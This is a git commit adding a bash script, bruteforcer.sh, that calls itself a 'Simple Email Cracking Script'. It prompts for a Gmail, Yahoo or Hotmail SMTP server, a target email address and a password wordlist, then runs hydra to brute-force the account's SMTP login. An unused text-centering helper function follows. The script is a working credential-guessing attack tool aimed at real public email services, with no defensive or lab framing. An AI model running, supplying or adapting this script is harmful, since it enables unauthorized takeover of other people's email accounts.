6cad36d5eda737a5ad4e8cbed9657b6d7ca73117
SINISTER-code <72219493+SINISTER-code@users.noreply.github.com>
2020-11-24 02:56:08 +0530

    Add files via upload

---
+++ bruteforcer.sh
@@ -0,0 +1,40 @@
+#! /bin/bash
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+BLUE='\033[0;34m'
+echo Simple Email Cracking Script in bash with hydra 
+echo NOTE: Make sure you have wordlists!
+echo Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:
+read smtp
+echo Enter Email Address:
+read email
+echo Provide Directory of Wordlist for Passwords:
+read wordlist
+
+hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp
+
+
+function print_center {
+     [[ $# == 0 ]] && return 1
+
+     declare -i TERM_COLS="$(tput cols)"
+     declare -i str_len="${#1}"
+     [[ $str_len -ge $TERM_COLS ]] && {
+          echo "$1";
+          return 0;
+     }
+
+     declare -i filler_len="$(( (TERM_COLS - str_len) / 2 ))"
+     [[ $# -ge 2 ]] && ch="${2:0:1}" || ch=" "
+     filler=""
+     for (( i = 0; i < filler_len; i++ )); do
+          filler="${filler}${ch}"
+     done
+
+     printf "%s%s%s" "$filler" "$1" "$filler"
+     [[ $(( (TERM_COLS - str_len) % 2 )) -ne 0 ]] && printf "%s" "${ch}"
+     printf "\n"
+
+     return 0
+}
